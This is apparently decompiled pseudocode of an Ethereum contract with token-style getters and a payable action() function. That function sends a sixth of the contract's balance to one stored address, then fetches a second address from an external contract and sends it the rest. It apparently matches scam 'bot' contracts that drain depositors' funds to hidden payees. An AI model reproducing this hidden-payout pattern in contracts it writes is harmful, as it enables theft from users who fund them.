contract main {




// =====================  Runtime code  =====================


array of uint256 tokenName;
array of uint256 tokenSymbol;
address stor3;
address tokenTransferAddress;

function creator() {
    return tokenTransferAddress
}

function tokenName() {
    return tokenName[0 len tokenName.length]
}

function tokenTransfer() {
    return tokenTransferAddress
}

function tokenSymbol() {
    return tokenSymbol[0 len tokenSymbol.length]
}

function _fallback() payable {
  stop
}

function action() payable {
    call tokenTransferAddress with:
       value eth.balance(this.address) / 6 wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require ext_code.size(stor3)
    staticcall stor3.0xb4226838 with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    call ext_call.return_data[12 len 20] with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require ext_code.size(stor3)
    staticcall stor3.performTasks() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
